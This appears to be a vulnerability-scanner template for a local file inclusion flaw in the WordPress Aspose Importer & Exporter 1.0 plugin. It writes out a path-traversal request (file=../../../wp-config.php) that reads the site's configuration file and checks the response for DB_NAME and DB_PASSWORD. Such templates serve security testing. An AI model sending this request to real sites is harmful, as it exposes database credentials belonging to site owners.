id: aspose-ie-file-download
brief:
    title: WordPress Aspose Importer & Exporter 1.0 - Local File Inclusion
    by: 0x_Akoko
    level: high
    about: WordPress Aspose Importer & Exporter version 1.0 is vulnerable to local file inclusion.
    label:
        - aspose
        - packetstorm
        - wordpress
        - wp-plugin
        - lfi
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/wp-content/plugins/aspose-importer-exporter/aspose_import_export_download?file=../../../wp-config.php'
      signs:
        - "on": word
          has:
            - DB_NAME
            - DB_PASSWORD
          in: body
          need: all
        - "on": status
          status:
            - 200
